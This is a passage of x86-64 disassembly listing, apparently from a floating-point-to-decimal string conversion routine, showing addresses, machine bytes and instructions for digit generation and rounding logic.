   32c486502:	0f 85 63 07 00 00    	jne    0x32c486c6b
   32c486508:	c7 44 24 70 00 00 00 	movl   $0x0,0x70(%rsp)
   32c48650f:	00 
   32c486510:	41 8b 41 14          	mov    0x14(%r9),%eax
   32c486514:	83 e8 01             	sub    $0x1,%eax
   32c486517:	48 98                	cltq
   32c486519:	45 0f bd 54 81 18    	bsr    0x18(%r9,%rax,4),%r10d
   32c48651f:	41 83 f2 1f          	xor    $0x1f,%r10d
   32c486523:	e9 5f f8 ff ff       	jmp    0x32c485d87
   32c486528:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c48652f:	00 
   32c486530:	c7 84 24 ac 00 00 00 	movl   $0x1,0xac(%rsp)
   32c486537:	01 00 00 00 
   32c48653b:	b9 01 00 00 00       	mov    $0x1,%ecx
   32c486540:	e8 fb eb ff ff       	call   0x32c485140
   32c486545:	44 8b 4c 24 64       	mov    0x64(%rsp),%r9d
   32c48654a:	44 8b 94 24 9c 00 00 	mov    0x9c(%rsp),%r10d
   32c486551:	00 
   32c486552:	48 89 c6             	mov    %rax,%rsi
   32c486555:	e9 59 f3 ff ff       	jmp    0x32c4858b3
   32c48655a:	c7 44 24 64 00 00 00 	movl   $0x0,0x64(%rsp)
   32c486561:	00 
   32c486562:	0f 1f 00             	nopl   (%rax)
   32c486565:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48656c:	00 00 00 00 
   32c486570:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   32c486575:	8b 54 24 58          	mov    0x58(%rsp),%edx
   32c486579:	45 29 fa             	sub    %r15d,%r10d
   32c48657c:	8b 40 04             	mov    0x4(%rax),%eax
   32c48657f:	44 29 d2             	sub    %r10d,%edx
   32c486582:	39 d0                	cmp    %edx,%eax
   32c486584:	0f 8f de 01 00 00    	jg     0x32c486768
   32c48658a:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
   32c48658e:	8b 44 24 68          	mov    0x68(%rsp),%eax
   32c486592:	8d 51 ff             	lea    -0x1(%rcx),%edx
   32c486595:	39 d0                	cmp    %edx,%eax
   32c486597:	0f 8c 6b 01 00 00    	jl     0x32c486708
   32c48659d:	29 d0                	sub    %edx,%eax
   32c48659f:	89 84 24 98 00 00 00 	mov    %eax,0x98(%rsp)
   32c4865a6:	85 c9                	test   %ecx,%ecx
   32c4865a8:	0f 89 c9 08 00 00    	jns    0x32c486e77
   32c4865ae:	c7 84 24 ac 00 00 00 	movl   $0x0,0xac(%rsp)
   32c4865b5:	00 00 00 00 
   32c4865b9:	8b 44 24 60          	mov    0x60(%rsp),%eax
   32c4865bd:	2b 44 24 48          	sub    0x48(%rsp),%eax
   32c4865c1:	89 84 24 88 00 00 00 	mov    %eax,0x88(%rsp)
   32c4865c8:	e9 1b f7 ff ff       	jmp    0x32c485ce8
   32c4865cd:	0f 1f 00             	nopl   (%rax)
   32c4865d0:	8b 54 24 68          	mov    0x68(%rsp),%edx
   32c4865d4:	85 d2                	test   %edx,%edx
   32c4865d6:	0f 85 fc 00 00 00    	jne    0x32c4866d8
   32c4865dc:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   32c4865e3:	00 00 
   32c4865e5:	8b 44 24 60          	mov    0x60(%rsp),%eax
   32c4865e9:	89 84 24 88 00 00 00 	mov    %eax,0x88(%rsp)
   32c4865f0:	e9 59 f7 ff ff       	jmp    0x32c485d4e
   32c4865f5:	8b 84 24 98 00 00 00 	mov    0x98(%rsp),%eax
   32c4865fc:	85 c0                	test   %eax,%eax
   32c4865fe:	74 50                	je     0x32c486650
   32c486600:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   32c486605:	89 c2                	mov    %eax,%edx
   32c486607:	e8 b4 10 00 00       	call   0x32c4876c0
   32c48660c:	48 89 da             	mov    %rbx,%rdx
   32c48660f:	48 89 c1             	mov    %rax,%rcx
   32c486612:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   32c486617:	e8 d4 0e 00 00       	call   0x32c4874f0
   32c48661c:	48 89 d9             	mov    %rbx,%rcx
   32c48661f:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
   32c486626:	00 
   32c486627:	e8 a4 0c 00 00       	call   0x32c4872d0
   32c48662c:	8b 84 24 98 00 00 00 	mov    0x98(%rsp),%eax
   32c486633:	29 44 24 68          	sub    %eax,0x68(%rsp)
   32c486637:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   32c48663e:	00 
   32c48663f:	0f 84 01 f7 ff ff    	je     0x32c485d46
   32c486645:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48664c:	00 00 00 00 
   32c486650:	8b 54 24 68          	mov    0x68(%rsp),%edx
   32c486654:	48 89 d9             	mov    %rbx,%rcx
   32c486657:	e8 64 10 00 00       	call   0x32c4876c0
   32c48665c:	c7 44 24 68 01 00 00 	movl   $0x1,0x68(%rsp)
   32c486663:	00 
   32c486664:	48 89 c3             	mov    %rax,%rbx
   32c486667:	e9 e2 f6 ff ff       	jmp    0x32c485d4e
   32c48666c:	c7 84 24 98 00 00 00 	movl   $0x1,0x98(%rsp)
   32c486673:	01 00 00 00 
   32c486677:	bf 05 00 00 00       	mov    $0x5,%edi
   32c48667c:	e9 ea f1 ff ff       	jmp    0x32c48586b
   32c486681:	8b 7c 24 30          	mov    0x30(%rsp),%edi
   32c486685:	31 c9                	xor    %ecx,%ecx
   32c486687:	f7 d7                	not    %edi
   32c486689:	e8 42 0c 00 00       	call   0x32c4872d0
   32c48668e:	8d 47 01             	lea    0x1(%rdi),%eax
   32c486691:	c7 44 24 40 10 00 00 	movl   $0x10,0x40(%rsp)
   32c486698:	00 
   32c486699:	89 44 24 38          	mov    %eax,0x38(%rsp)
   32c48669d:	48 89 f0             	mov    %rsi,%rax
   32c4866a0:	e9 0a f8 ff ff       	jmp    0x32c485eaf
   32c4866a5:	89 c2                	mov    %eax,%edx
   32c4866a7:	e9 b1 fa ff ff       	jmp    0x32c48615d
   32c4866ac:	c7 84 24 80 00 00 00 	movl   $0x0,0x80(%rsp)
   32c4866b3:	00 00 00 00 
   32c4866b7:	ba 01 00 00 00       	mov    $0x1,%edx
   32c4866bc:	29 c2                	sub    %eax,%edx
   32c4866be:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   32c4866c2:	89 54 24 60          	mov    %edx,0x60(%rsp)
   32c4866c6:	89 44 24 50          	mov    %eax,0x50(%rsp)
   32c4866ca:	89 44 24 70          	mov    %eax,0x70(%rsp)
   32c4866ce:	e9 fd ef ff ff       	jmp    0x32c4856d0
   32c4866d3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c4866d8:	8b 54 24 68          	mov    0x68(%rsp),%edx
   32c4866dc:	48 89 d9             	mov    %rbx,%rcx
   32c4866df:	e8 dc 0f 00 00       	call   0x32c4876c0
   32c4866e4:	c7 44 24 68 00 00 00 	movl   $0x0,0x68(%rsp)
   32c4866eb:	00 
   32c4866ec:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   32c4866f3:	00 00 
   32c4866f5:	48 89 c3             	mov    %rax,%rbx
   32c4866f8:	8b 44 24 60          	mov    0x60(%rsp),%eax
   32c4866fc:	89 84 24 88 00 00 00 	mov    %eax,0x88(%rsp)
   32c486703:	e9 46 f6 ff ff       	jmp    0x32c485d4e
   32c486708:	89 d0                	mov    %edx,%eax
   32c48670a:	2b 44 24 68          	sub    0x68(%rsp),%eax
   32c48670e:	01 44 24 70          	add    %eax,0x70(%rsp)
   32c486712:	b9 01 00 00 00       	mov    $0x1,%ecx
   32c486717:	8b 44 24 48          	mov    0x48(%rsp),%eax
   32c48671b:	89 94 24 88 00 00 00 	mov    %edx,0x88(%rsp)
   32c486722:	01 44 24 50          	add    %eax,0x50(%rsp)
   32c486726:	89 84 24 ac 00 00 00 	mov    %eax,0xac(%rsp)
   32c48672d:	e8 fe 0c 00 00       	call   0x32c487430
   32c486732:	44 8b 5c 24 60       	mov    0x60(%rsp),%r11d
   32c486737:	8b 94 24 88 00 00 00 	mov    0x88(%rsp),%edx
   32c48673e:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   32c486743:	45 85 db             	test   %r11d,%r11d
   32c486746:	0f 85 66 03 00 00    	jne    0x32c486ab2
   32c48674c:	8b 44 24 48          	mov    0x48(%rsp),%eax
   32c486750:	89 54 24 68          	mov    %edx,0x68(%rsp)
   32c486754:	c7 84 24 88 00 00 00 	movl   $0x0,0x88(%rsp)
   32c48675b:	00 00 00 00 
   32c48675f:	89 44 24 60          	mov    %eax,0x60(%rsp)
   32c486763:	e9 e8 fe ff ff       	jmp    0x32c486650
   32c486768:	8d 57 fd             	lea    -0x3(%rdi),%edx
   32c48676b:	83 e2 fd             	and    $0xfffffffd,%edx
   32c48676e:	0f 84 16 fe ff ff    	je     0x32c48658a
   32c486774:	e9 21 f5 ff ff       	jmp    0x32c485c9a
   32c486779:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c486780:	8b 54 24 4c          	mov    0x4c(%rsp),%edx
   32c486784:	c6 06 31             	movb   $0x31,(%rsi)
   32c486787:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   32c48678e:	00 
   32c48678f:	83 c2 02             	add    $0x2,%edx
   32c486792:	89 54 24 38          	mov    %edx,0x38(%rsp)
   32c486796:	e9 45 fb ff ff       	jmp    0x32c4862e0
   32c48679b:	48 89 d9             	mov    %rbx,%rcx
   32c48679e:	ba 01 00 00 00       	mov    $0x1,%edx
   32c4867a3:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
   32c4867a8:	4c 89 5c 24 30       	mov    %r11,0x30(%rsp)
   32c4867ad:	44 89 44 24 40       	mov    %r8d,0x40(%rsp)
   32c4867b2:	e8 99 10 00 00       	call   0x32c487850
   32c4867b7:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   32c4867bc:	48 89 c1             	mov    %rax,%rcx
   32c4867bf:	48 89 c3             	mov    %rax,%rbx
   32c4867c2:	e8 f9 11 00 00       	call   0x32c4879c0
   32c4867c7:	4c 8b 4c 24 28       	mov    0x28(%rsp),%r9
   32c4867cc:	4c 8b 5c 24 30       	mov    0x30(%rsp),%r11
   32c4867d1:	85 c0                	test   %eax,%eax
   32c4867d3:	0f 8f f0 fc ff ff    	jg     0x32c4864c9
   32c4867d9:	75 0b                	jne    0x32c4867e6
   32c4867db:	f6 44 24 40 01       	testb  $0x1,0x40(%rsp)
   32c4867e0:	0f 85 e3 fc ff ff    	jne    0x32c4864c9
   32c4867e6:	c7 44 24 40 10 00 00 	movl   $0x10,0x40(%rsp)
   32c4867ed:	00 
   32c4867ee:	4c 89 d8             	mov    %r11,%rax
   32c4867f1:	83 7b 14 01          	cmpl   $0x1,0x14(%rbx)
   32c4867f5:	0f 8f e5 fa ff ff    	jg     0x32c4862e0
   32c4867fb:	8b 43 18             	mov    0x18(%rbx),%eax
   32c4867fe:	e9 93 fc ff ff       	jmp    0x32c486496
   32c486803:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c486808:	8b 44 24 68          	mov    0x68(%rsp),%eax
   32c48680c:	01 54 24 50          	add    %edx,0x50(%rsp)
   32c486810:	c7 44 24 64 00 00 00 	movl   $0x0,0x64(%rsp)
   32c486817:	00 
   32c486818:	89 84 24 98 00 00 00 	mov    %eax,0x98(%rsp)
   32c48681f:	8b 44 24 60          	mov    0x60(%rsp),%eax
   32c486823:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   32c48682a:	00 
   32c48682b:	89 84 24 88 00 00 00 	mov    %eax,0x88(%rsp)
   32c486832:	01 d0                	add    %edx,%eax
   32c486834:	89 44 24 60          	mov    %eax,0x60(%rsp)
   32c486838:	c7 44 24 78 ff ff ff 	movl   $0xffffffff,0x78(%rsp)
   32c48683f:	ff 
   32c486840:	c7 44 24 48 ff ff ff 	movl   $0xffffffff,0x48(%rsp)
   32c486847:	ff 
   32c486848:	e9 9b f4 ff ff       	jmp    0x32c485ce8
   32c48684d:	66 49 0f 6e d9       	movq   %r9,%xmm3
   32c486852:	f2 0f 10 0d a6 59 00 	movsd  0x59a6(%rip),%xmm1        # 0x32c48c200
   32c486859:	00 
   32c48685a:	48 89 f0             	mov    %rsi,%rax
   32c48685d:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   32c486863:	f2 0f 59 da          	mulsd  %xmm2,%xmm3
   32c486867:	eb 1f                	jmp    0x32c486888
   32c486869:	90                   	nop
   32c48686a:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c486871:	00 00 00 00 
   32c486875:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48687c:	00 00 00 00 
   32c486880:	f2 0f 59 c1          	mulsd  %xmm1,%xmm0
   32c486884:	41 83 c1 01          	add    $0x1,%r9d
   32c486888:	f2 0f 2c d0          	cvttsd2si %xmm0,%edx
   32c48688c:	44 89 8c 24 ac 00 00 	mov    %r9d,0xac(%rsp)
   32c486893:	00 
   32c486894:	85 d2                	test   %edx,%edx
   32c486896:	74 0c                	je     0x32c4868a4
   32c486898:	66 0f ef d2          	pxor   %xmm2,%xmm2
   32c48689c:	f2 0f 2a d2          	cvtsi2sd %edx,%xmm2
   32c4868a0:	f2 0f 5c c2          	subsd  %xmm2,%xmm0
   32c4868a4:	48 83 c0 01          	add    $0x1,%rax
   32c4868a8:	83 c2 30             	add    $0x30,%edx
   32c4868ab:	88 50 ff             	mov    %dl,-0x1(%rax)
   32c4868ae:	44 8b 8c 24 ac 00 00 	mov    0xac(%rsp),%r9d
   32c4868b5:	00 
   32c4868b6:	45 39 c1             	cmp    %r8d,%r9d
   32c4868b9:	75 c5                	jne    0x32c486880
   32c4868bb:	f2 0f 10 0d 6d 59 00 	movsd  0x596d(%rip),%xmm1        # 0x32c48c230
   32c4868c2:	00 
   32c4868c3:	66 0f 28 d3          	movapd %xmm3,%xmm2
   32c4868c7:	f2 0f 58 d1          	addsd  %xmm1,%xmm2
   32c4868cb:	66 0f 2f c2          	comisd %xmm2,%xmm0
   32c4868cf:	0f 87 db f2 ff ff    	ja     0x32c485bb0
   32c4868d5:	f2 0f 5c cb          	subsd  %xmm3,%xmm1
   32c4868d9:	66 0f 2f c8          	comisd %xmm0,%xmm1
   32c4868dd:	0f 87 cc 02 00 00    	ja     0x32c486baf
   32c4868e3:	44 8b 44 24 58       	mov    0x58(%rsp),%r8d
   32c4868e8:	45 85 c0             	test   %r8d,%r8d
   32c4868eb:	0f 88 72 04 00 00    	js     0x32c486d63
   32c4868f1:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   32c4868f6:	8b 50 14             	mov    0x14(%rax),%edx
   32c4868f9:	85 d2                	test   %edx,%edx
   32c4868fb:	0f 88 62 04 00 00    	js     0x32c486d63
   32c486901:	c7 44 24 64 00 00 00 	movl   $0x0,0x64(%rsp)
   32c486908:	00 
   32c486909:	f2 0f 10 11          	movsd  (%rcx),%xmm2
   32c48690d:	e9 ae f1 ff ff       	jmp    0x32c485ac0
   32c486912:	44 8b 5c 24 64       	mov    0x64(%rsp),%r11d
   32c486917:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   32c48691c:	45 89 e8             	mov    %r13d,%r8d
   32c48691f:	4d 89 f2             	mov    %r14,%r10
   32c486922:	4c 8b 4c 24 28       	mov    0x28(%rsp),%r9
   32c486927:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   32c48692c:	48 89 7c 24 50       	mov    %rdi,0x50(%rsp)
   32c486931:	44 89 e7             	mov    %r12d,%edi
   32c486934:	4c 8b 6c 24 70       	mov    0x70(%rsp),%r13
   32c486939:	4c 8b 74 24 78       	mov    0x78(%rsp),%r14
   32c48693e:	4c 8b a4 24 80 00 00 	mov    0x80(%rsp),%r12
   32c486945:	00 
   32c486946:	45 85 db             	test   %r11d,%r11d
   32c486949:	0f 84 99 02 00 00    	je     0x32c486be8
   32c48694f:	83 7b 14 01          	cmpl   $0x1,0x14(%rbx)
   32c486953:	0f 8e 7f 04 00 00    	jle    0x32c486dd8
   32c486959:	83 7c 24 64 02       	cmpl   $0x2,0x64(%rsp)
   32c48695e:	0f 84 eb 02 00 00    	je     0x32c486c4f
   32c486964:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   32c486969:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   32c48696e:	44 89 c7             	mov    %r8d,%edi
   32c486971:	4d 89 cf             	mov    %r9,%r15
   32c486974:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   32c486979:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   32c48697e:	4d 89 d5             	mov    %r10,%r13
   32c486981:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   32c486986:	eb 4b                	jmp    0x32c4869d3
   32c486988:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c48698f:	00 
   32c486990:	41 88 7d 00          	mov    %dil,0x0(%r13)
   32c486994:	45 31 c0             	xor    %r8d,%r8d
   32c486997:	48 89 f1             	mov    %rsi,%rcx
   32c48699a:	ba 0a 00 00 00       	mov    $0xa,%edx
   32c48699f:	49 83 c5 01          	add    $0x1,%r13
   32c4869a3:	e8 98 09 00 00       	call   0x32c487340
   32c4869a8:	48 39 f5             	cmp    %rsi,%rbp
   32c4869ab:	48 89 d9             	mov    %rbx,%rcx
   32c4869ae:	ba 0a 00 00 00       	mov    $0xa,%edx
   32c4869b3:	48 0f 44 e8          	cmove  %rax,%rbp
   32c4869b7:	45 31 c0             	xor    %r8d,%r8d
   32c4869ba:	48 89 c6             	mov    %rax,%rsi
   32c4869bd:	e8 7e 09 00 00       	call   0x32c487340
   32c4869c2:	4c 89 fa             	mov    %r15,%rdx
   32c4869c5:	48 89 c1             	mov    %rax,%rcx
   32c4869c8:	48 89 c3             	mov    %rax,%rbx
   32c4869cb:	e8 80 e8 ff ff       	call   0x32c485250
   32c4869d0:	8d 78 30             	lea    0x30(%rax),%edi
   32c4869d3:	48 89 f2             	mov    %rsi,%rdx
   32c4869d6:	4c 89 f9             	mov    %r15,%rcx
   32c4869d9:	e8 e2 0f 00 00       	call   0x32c4879c0
   32c4869de:	85 c0                	test   %eax,%eax
   32c4869e0:	7f ae                	jg     0x32c486990
   32c4869e2:	41 89 f8             	mov    %edi,%r8d
   32c4869e5:	48 89 74 24 50       	mov    %rsi,0x50(%rsp)
   32c4869ea:	48 89 f0             	mov    %rsi,%rax
   32c4869ed:	4d 89 ea             	mov    %r13,%r10
   32c4869f0:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
   32c4869f5:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
   32c4869fa:	48 89 ef             	mov    %rbp,%rdi
   32c4869fd:	4d 89 f9             	mov    %r15,%r9
   32c486a00:	4c 8b 6c 24 30       	mov    0x30(%rsp),%r13
   32c486a05:	4c 8b 64 24 40       	mov    0x40(%rsp),%r12
   32c486a0a:	41 83 f8 39          	cmp    $0x39,%r8d
   32c486a0e:	0f 84 28 04 00 00    	je     0x32c486e3c
   32c486a14:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   32c486a19:	41 83 c0 01          	add    $0x1,%r8d
   32c486a1d:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   32c486a24:	00 
   32c486a25:	45 88 02             	mov    %r8b,(%r10)
   32c486a28:	49 8d 42 01          	lea    0x1(%r10),%rax
   32c486a2c:	e9 af f8 ff ff       	jmp    0x32c4862e0
   32c486a31:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   32c486a36:	8b 40 04             	mov    0x4(%rax),%eax
   32c486a39:	83 c0 01             	add    $0x1,%eax
   32c486a3c:	39 44 24 28          	cmp    %eax,0x28(%rsp)
   32c486a40:	0f 8e 3b f3 ff ff    	jle    0x32c485d81
   32c486a46:	83 44 24 60 01       	addl   $0x1,0x60(%rsp)
   32c486a4b:	41 ba 1f 00 00 00    	mov    $0x1f,%r10d
   32c486a51:	83 44 24 50 01       	addl   $0x1,0x50(%rsp)
   32c486a56:	c7 44 24 70 01 00 00 	movl   $0x1,0x70(%rsp)
   32c486a5d:	00 
   32c486a5e:	e9 24 f3 ff ff       	jmp    0x32c485d87
   32c486a63:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c486a68:	8b 48 08             	mov    0x8(%rax),%ecx
   32c486a6b:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
   32c486a70:	e8 4b 07 00 00       	call   0x32c4871c0
   32c486a75:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   32c486a7a:	49 89 c7             	mov    %rax,%r15
   32c486a7d:	48 63 41 14          	movslq 0x14(%rcx),%rax
   32c486a81:	48 8d 51 10          	lea    0x10(%rcx),%rdx
   32c486a85:	49 8d 4f 10          	lea    0x10(%r15),%rcx
   32c486a89:	4c 8d 04 85 08 00 00 	lea    0x8(,%rax,4),%r8
   32c486a90:	00 
   32c486a91:	e8 0a 1a 00 00       	call   0x32c4884a0
   32c486a96:	ba 01 00 00 00       	mov    $0x1,%edx
   32c486a9b:	4c 89 f9             	mov    %r15,%rcx
   32c486a9e:	e8 ad 0d 00 00       	call   0x32c487850
   32c486aa3:	4c 8b 4c 24 28       	mov    0x28(%rsp),%r9
   32c486aa8:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   32c486aad:	e9 5a f6 ff ff       	jmp    0x32c48610c
   32c486ab2:	44 8b 5c 24 60       	mov    0x60(%rsp),%r11d
   32c486ab7:	44 8b 54 24 50       	mov    0x50(%rsp),%r10d
   32c486abc:	89 54 24 68          	mov    %edx,0x68(%rsp)
   32c486ac0:	8b 44 24 48          	mov    0x48(%rsp),%eax
   32c486ac4:	45 39 d3             	cmp    %r10d,%r11d
   32c486ac7:	41 8d 0c 03          	lea    (%r11,%rax,1),%ecx
   32c486acb:	44 89 d0             	mov    %r10d,%eax
   32c486ace:	41 0f 4e c3          	cmovle %r11d,%eax
   32c486ad2:	41 29 c3             	sub    %eax,%r11d
   32c486ad5:	41 29 c2             	sub    %eax,%r10d
   32c486ad8:	29 c1                	sub    %eax,%ecx
   32c486ada:	89 84 24 ac 00 00 00 	mov    %eax,0xac(%rsp)
   32c486ae1:	44 89 9c 24 88 00 00 	mov    %r11d,0x88(%rsp)
   32c486ae8:	00 
   32c486ae9:	44 89 54 24 50       	mov    %r10d,0x50(%rsp)
   32c486aee:	89 4c 24 60          	mov    %ecx,0x60(%rsp)
   32c486af2:	e9 59 fb ff ff       	jmp    0x32c486650
   32c486af7:	c6 06 31             	movb   $0x31,(%rsi)
   32c486afa:	48 8d 46 01          	lea    0x1(%rsi),%rax
   32c486afe:	31 c9                	xor    %ecx,%ecx
   32c486b00:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   32c486b05:	e8 c6 07 00 00       	call   0x32c4872d0
   32c486b0a:	c7 44 24 38 02 00 00 	movl   $0x2,0x38(%rsp)
   32c486b11:	00 
   32c486b12:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   32c486b17:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   32c486b1e:	00 
   32c486b1f:	e9 6c f3 ff ff       	jmp    0x32c485e90
   32c486b24:	45 89 e8             	mov    %r13d,%r8d
   32c486b27:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   32c486b2c:	4d 89 f2             	mov    %r14,%r10
   32c486b2f:	4c 8b 4c 24 28       	mov    0x28(%rsp),%r9
   32c486b34:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   32c486b39:	4c 8b 6c 24 70       	mov    0x70(%rsp),%r13
   32c486b3e:	48 89 7c 24 50       	mov    %rdi,0x50(%rsp)
   32c486b43:	4c 8b 74 24 78       	mov    0x78(%rsp),%r14
   32c486b48:	4c 8b a4 24 80 00 00 	mov    0x80(%rsp),%r12
   32c486b4f:	00 
   32c486b50:	41 83 f8 39          	cmp    $0x39,%r8d
   32c486b54:	0f 84 63 02 00 00    	je     0x32c486dbd
   32c486b5a:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   32c486b5f:	41 83 c0 01          	add    $0x1,%r8d
   32c486b63:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   32c486b68:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   32c486b6f:	00 
   32c486b70:	45 88 02             	mov    %r8b,(%r10)
   32c486b73:	4c 89 f8             	mov    %r15,%rax
   32c486b76:	48 89 4c 24 58       	mov    %rcx,0x58(%rsp)
   32c486b7b:	e9 60 f7 ff ff       	jmp    0x32c4862e0
   32c486b80:	48 89 f8             	mov    %rdi,%rax
   32c486b83:	45 89 e8             	mov    %r13d,%r8d
   32c486b86:	48 89 f7             	mov    %rsi,%rdi
   32c486b89:	4c 8b 4c 24 28       	mov    0x28(%rsp),%r9
   32c486b8e:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   32c486b93:	4c 8b 6c 24 70       	mov    0x70(%rsp),%r13
   32c486b98:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   32c486b9d:	4c 8b 74 24 78       	mov    0x78(%rsp),%r14
   32c486ba2:	4c 8b a4 24 80 00 00 	mov    0x80(%rsp),%r12
   32c486ba9:	00 
   32c486baa:	e9 c5 f8 ff ff       	jmp    0x32c486474
   32c486baf:	66 0f ef c9          	pxor   %xmm1,%xmm1
   32c486bb3:	31 d2                	xor    %edx,%edx
   32c486bb5:	41 8d 7b 01          	lea    0x1(%r11),%edi
   32c486bb9:	b9 01 00 00 00       	mov    $0x1,%ecx
   32c486bbe:	66 0f 2e c1          	ucomisd %xmm1,%xmm0
   32c486bc2:	89 7c 24 38          	mov    %edi,0x38(%rsp)
   32c486bc6:	0f 9a c2             	setp   %dl
   32c486bc9:	0f 45 d1             	cmovne %ecx,%edx
   32c486bcc:	c1 e2 04             	shl    $0x4,%edx
   32c486bcf:	89 54 24 40          	mov    %edx,0x40(%rsp)
   32c486bd3:	e9 b8 f2 ff ff       	jmp    0x32c485e90
   32c486bd8:	c6 06 30             	movb   $0x30,(%rsi)
   32c486bdb:	41 83 c3 01          	add    $0x1,%r11d
   32c486bdf:	0f b6 50 ff          	movzbl -0x1(%rax),%edx
   32c486be3:	e9 d1 ef ff ff       	jmp    0x32c485bb9
   32c486be8:	85 d2                	test   %edx,%edx
   32c486bea:	7e 59                	jle    0x32c486c45
   32c486bec:	48 89 d9             	mov    %rbx,%rcx
   32c486bef:	ba 01 00 00 00       	mov    $0x1,%edx
   32c486bf4:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
   32c486bf9:	4c 89 54 24 40       	mov    %r10,0x40(%rsp)
   32c486bfe:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
   32c486c03:	e8 48 0c 00 00       	call   0x32c487850
   32c486c08:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   32c486c0d:	48 89 c1             	mov    %rax,%rcx
   32c486c10:	48 89 c3             	mov    %rax,%rbx
   32c486c13:	e8 a8 0d 00 00       	call   0x32c4879c0
   32c486c18:	4c 8b 4c 24 28       	mov    0x28(%rsp),%r9
   32c486c1d:	44 8b 44 24 30       	mov    0x30(%rsp),%r8d
   32c486c22:	85 c0                	test   %eax,%eax
   32c486c24:	4c 8b 54 24 40       	mov    0x40(%rsp),%r10
   32c486c29:	0f 8e 6a 02 00 00    	jle    0x32c486e99
   32c486c2f:	41 83 f8 39          	cmp    $0x39,%r8d
   32c486c33:	0f 84 03 02 00 00    	je     0x32c486e3c
   32c486c39:	c7 44 24 64 20 00 00 	movl   $0x20,0x64(%rsp)
   32c486c40:	00 
   32c486c41:	44 8d 47 31          	lea    0x31(%rdi),%r8d
   32c486c45:	83 7b 14 01          	cmpl   $0x1,0x14(%rbx)
   32c486c49:	0f 8e 05 02 00 00    	jle    0x32c486e54
   32c486c4f:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   32c486c54:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   32c486c59:	c7 44 24 40 10 00 00 	movl   $0x10,0x40(%rsp)
   32c486c60:	00 
   32c486c61:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   32c486c66:	e9 ba fd ff ff       	jmp    0x32c486a25
   32c486c6b:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   32c486c70:	8b 40 04             	mov    0x4(%rax),%eax
   32c486c73:	83 c0 01             	add    $0x1,%eax
   32c486c76:	39 44 24 28          	cmp    %eax,0x28(%rsp)
   32c486c7a:	0f 8e 88 f8 ff ff    	jle    0x32c486508
   32c486c80:	83 44 24 60 01       	addl   $0x1,0x60(%rsp)
   32c486c85:	83 44 24 50 01       	addl   $0x1,0x50(%rsp)
   32c486c8a:	c7 44 24 70 01 00 00 	movl   $0x1,0x70(%rsp)
   32c486c91:	00 
   32c486c92:	e9 79 f8 ff ff       	jmp    0x32c486510
   32c486c97:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c486c9e:	00 00 
   32c486ca0:	44 8b 44 24 78       	mov    0x78(%rsp),%r8d
   32c486ca5:	45 85 c0             	test   %r8d,%r8d
   32c486ca8:	0f 8e 90 f2 ff ff    	jle    0x32c485f3e
   32c486cae:	f2 0f 59 05 4a 55 00 	mulsd  0x554a(%rip),%xmm0        # 0x32c48c200
   32c486cb5:	00 
   32c486cb6:	f2 0f 10 0d 4a 55 00 	movsd  0x554a(%rip),%xmm1        # 0x32c48c208
   32c486cbd:	00 
   32c486cbe:	41 bb ff ff ff ff    	mov    $0xffffffff,%r11d
